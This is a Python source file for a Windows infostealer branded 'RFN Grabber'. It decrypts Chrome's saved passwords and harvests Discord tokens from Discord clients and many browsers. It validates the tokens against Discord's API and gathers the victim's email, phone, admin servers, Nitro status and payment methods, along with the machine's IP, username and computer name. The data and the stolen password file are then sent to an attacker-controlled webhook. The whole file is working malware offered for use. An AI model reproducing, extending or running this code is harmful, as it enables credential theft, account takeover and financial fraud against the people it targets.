import os
import shutil
import sqlite3
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import urllib.request
import re
import datetime
import sys
import random
import string

class ChromePasswordExtractor:
    def __init__(self):
        self.chrome_db_path = None
        self.local_state_path = None
        self.encryption_key = None

    def _get_chrome_db_path(self):
        return os.path.join(
            os.environ['USERPROFILE'], 'AppData', 'Local',
            'Google', 'Chrome', 'User Data', 'Default', 'Login Data'
        )

    def _get_encryption_key(self):
        self.local_state_path = os.path.join(
            os.environ['USERPROFILE'], 'AppData', 'Local',
            'Google', 'Chrome', 'User Data', 'Local State'
        )
        
        with open(self.local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    def _decrypt_password(self, encrypted_password, key):
        if not encrypted_password:
            return ""
        
        try:
            if encrypted_password[:3] == b'v10':
                iv = encrypted_password[3:15]
                payload = encrypted_password[15:]
                cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                return cipher.decrypt(payload)[:-16].decode('utf-8')
            else:
                return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
        except Exception:
            return ""

    def extract_passwords(self):
        self.chrome_db_path = self._get_chrome_db_path()
        temp_db = "ChromeData.db"
        
        try:
            shutil.copyfile(self.chrome_db_path, temp_db)
            db = sqlite3.connect(temp_db)
            cursor = db.cursor()

            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            self.encryption_key = self._get_encryption_key()

            credentials = []
            for url, username, encrypted in cursor.fetchall():
                password = self._decrypt_password(encrypted, self.encryption_key)
                if username or password:
                    credentials.append({
                        "url": url,
                        "username": username,
                        "password": password
                    })

            with open("creds.json", "w") as f:
                json.dump(credentials, f, indent=4)

        except Exception as e:
            print("")
        finally:
            cursor.close()
            db.close()
            if os.path.exists(temp_db):
                os.remove(temp_db)

class DiscordTokenGrabber:
    def __init__(self, webhook_url):
        self.LOCAL = os.getenv("LOCALAPPDATA")
        self.ROAMING = os.getenv("APPDATA")
        self.PATHS = {
            'Discord': self.ROAMING + '\\discord',
            'Discord Canary': self.ROAMING + '\\discordcanary',
            'Lightcord': self.ROAMING + '\\Lightcord',
            'Discord PTB': self.ROAMING + '\\discordptb',
            'Opera': self.ROAMING + '\\Opera Software\\Opera Stable',
            'Opera GX': self.ROAMING + '\\Opera Software\\Opera GX Stable',
            'Amigo': self.LOCAL + '\\Amigo\\User Data',
            'Torch': self.LOCAL + '\\Torch\\User Data',
            'Kometa': self.LOCAL + '\\Kometa\\User Data',
            'Orbitum': self.LOCAL + '\\Orbitum\\User Data',
            'CentBrowser': self.LOCAL + '\\CentBrowser\\User Data',
            '7Star': self.LOCAL + '\\7Star\\7Star\\User Data',
            'Sputnik': self.LOCAL + '\\Sputnik\\Sputnik\\User Data',
            'Vivaldi': self.LOCAL + '\\Vivaldi\\User Data\\Default',
            'Chrome SxS': self.LOCAL + '\\Google\\Chrome SxS\\User Data',
            'Chrome': self.LOCAL + "\\Google\\Chrome\\User Data\\Default",
            'Epic Privacy Browser': self.LOCAL + '\\Epic Privacy Browser\\User Data',
            'Microsoft Edge': self.LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
            'Uran': self.LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
            'Yandex': self.LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
            'Brave': self.LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Iridium': self.LOCAL + '\\Iridium\\User Data\\Default'
        }
        self.webhook_url = webhook_url
        self.headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
        }
        self.ip_api = "https://api.ipify.org?format=json"

    def _get_ip(self):
        try:
            with urllib.request.urlopen(self.ip_api) as res:
                return json.loads(res.read().decode()).get("ip", "None")
        except:
            return "None"

    def _get_tokens(self, path):
        tokens = []
        path += "\\Local Storage\\leveldb\\"

        if not os.path.exists(path):
            return tokens

        for file in os.listdir(path):
            if not (file.endswith(".ldb") or file.endswith(".log")):
                continue

            try:
                with open(f"{path}{file}", "r", errors="ignore") as f:
                    for line in f:
                        for match in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                            tokens.append(match.replace("\\", ""))
            except PermissionError:
                continue

        return tokens

    def _get_decryption_key(self, path):
        try:
            with open(path + "\\Local State", "r") as f:
                encrypted_key = json.load(f)['os_crypt']['encrypted_key']
                return win32crypt.CryptUnprotectData(base64.b64decode(encrypted_key)[5:], None, None, None, 0)[1]
        except:
            return None

    def _decrypt_token(self, encrypted_token, key):
        try:
            encrypted_token = base64.b64decode(encrypted_token.split('dQw4w9WgXcQ:')[1])
            iv = encrypted_token[3:15]
            payload = encrypted_token[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        except:
            return None

    def _send_to_webhook(self, data, file_path=None):
        try:
            boundary = '----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            body = []

            body.append(f'--{boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\nContent-Type: application/json\r\n\r\n{json.dumps(data)}\r\n')

            if file_path and os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    file_content = f.read()
                body.append(
                    f'--{boundary}\r\nContent-Disposition: form-data; name="file"; filename="{os.path.basename(file_path)}"\r\n'
                    f'Content-Type: application/octet-stream\r\n\r\n'
                )
                body.append(file_content)
                body.append(f'\r\n--{boundary}--\r\n')

            payload = b''
            for part in body:
                if isinstance(part, str):
                    payload += part.encode('utf-8')
                else:
                    payload += part

            headers = self.headers.copy()
            headers.update({"Content-Type": f"multipart/form-data; boundary={boundary}"})

            req = urllib.request.Request(
                self.webhook_url,
                data=payload,
                headers=headers,
                method='POST'
            )
            urllib.request.urlopen(req)
        except Exception as e:
            print("")

    def run(self):
        chrome = ChromePasswordExtractor()
        chrome.extract_passwords()

        checked_tokens = []
        for platform, path in self.PATHS.items():
            if not os.path.exists(path):
                continue

            tokens = self._get_tokens(path)
            key = self._get_decryption_key(path)

            for token in tokens:
                if token in checked_tokens:
                    continue

                decrypted_token = self._decrypt_token(token, key) if key else token
                if not decrypted_token or decrypted_token in checked_tokens:
                    continue

                checked_tokens.append(decrypted_token)

                try:
                    headers = self.headers.copy()
                    headers.update({"Authorization": decrypted_token})

                    req = urllib.request.Request(
                        'https://discord.com/api/v10/users/@me',
                        headers=headers
                    )
                    with urllib.request.urlopen(req) as res:
                        if res.getcode() != 200:
                            continue
                        user_data = json.loads(res.read().decode())

                    req = urllib.request.Request(
                        'https://discord.com/api/v10/users/@me/guilds?with_counts=true',
                        headers=headers
                    )
                    guilds_data = json.loads(urllib.request.urlopen(req).read().decode())
                    guild_count = len(guilds_data)
                    guild_info = []

                    for guild in guilds_data:
                        if isinstance(guild.get('permissions'), int) and (guild['permissions'] & 8 or guild['permissions'] & 32):
                            req = urllib.request.Request(
                                f'https://discord.com/api/v10/guilds/{guild["id"]}',
                                headers=headers
                            )
                            guild_details = json.loads(urllib.request.urlopen(req).read().decode())
                            vanity = f"; .gg/{guild_details['vanity_url_code']}" if guild_details.get('vanity_url_code') else ""
                            guild_info.append(f"ㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}")

                    if not guild_info:
                        guild_info = ["No guilds"]

                    has_nitro = False
                    nitro_expiry = None
                    try:
                        req = urllib.request.Request(
                            'https://discord.com/api/v10/users/@me/billing/subscriptions',
                            headers=headers
                        )
                        nitro_data = json.loads(urllib.request.urlopen(req).read().decode())
                        has_nitro = bool(nitro_data)
                        if has_nitro:
                            nitro_expiry = datetime.datetime.strptime(
                                nitro_data[0]["current_period_end"],
                                "%Y-%m-%dT%H:%M:%S.%f%z"
                            ).strftime('%d/%m/%Y at %H:%M:%S')
                    except urllib.error.HTTPError:
                        pass

                    boost_info = []
                    available_boosts = 0
                    try:
                        req = urllib.request.Request(
                            'https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots',
                            headers=headers
                        )
                        boost_data = json.loads(urllib.request.urlopen(req).read().decode())
                        for boost in boost_data:
                            cooldown = datetime.datetime.strptime(
                                boost["cooldown_ends_at"],
                                "%Y-%m-%dT%H:%M:%S.%f%z"
                            )
                            if cooldown <= datetime.datetime.now(datetime.timezone.utc):
                                boost_info.append("ㅤ- Available now")
                                available_boosts += 1
                            else:
                                boost_info.append(f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}")
                    except urllib.error.HTTPError:
                        pass

                    payment_methods = []
                    valid_methods = 0
                    try:
                        req = urllib.request.Request(
                            'https://discord.com/api/v10/users/@me/billing/payment-sources',
                            headers=headers
                        )
                        payment_data = json.loads(urllib.request.urlopen(req).read().decode())
                        for method in payment_data:
                            if method['type'] == 1:
                                payment_methods.append("CreditCard")
                                if not method['invalid']:
                                    valid_methods += 1
                            elif method['type'] == 2:
                                payment_methods.append("PayPal")
                                if not method['invalid']:
                                    valid_methods += 1
                    except urllib.error.HTTPError:
                        pass

                    embed = {
                        "embeds": [{
                            "title": f"**New user data: {user_data['username']}**",
                            "description": f"""
```yaml
User ID: {user_data['id']}
Email: {user_data['email']}
Phone: {user_data.get('phone', 'None')}

Guilds: {guild_count}
Admin Guilds: 
{"\n".join(guild_info)}
MFA Enabled: {user_data['mfa_enabled']}
Flags: {user_data['flags']}
Locale: {user_data['locale']}
Verified: {user_data['verified']}
IP: {self._get_ip()}
Username: {os.getenv("USERNAME")}
PC Name: {os.getenv("COMPUTERNAME")}
Token Location: {platform}
{decrypted_token}
```""",
                            "color": 3092790,
                            "footer": {"text": "Made by RFN | RFN"},
                            "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png"}
                        }],
                        "username": "RFN Grabber",
                        "avatar_url": "https://img.freepik.com/free-vector/3d-metal-star-isolated_1308-117760.jpg"
                    }

                    self._send_to_webhook(embed, "creds.json")

                except urllib.error.HTTPError as e:
                    if e.code == 401:
                        print("")
                    else:
                        print("")
                except Exception as e:
                    print("")

        if os.path.exists("creds.json"):
            os.remove("creds.json")

if __name__ == "__main__":
    WEBHOOK_URL = "WEBHOOKURLHERE"  
    grabber = DiscordTokenGrabber(WEBHOOK_URL)

    grabber.run()
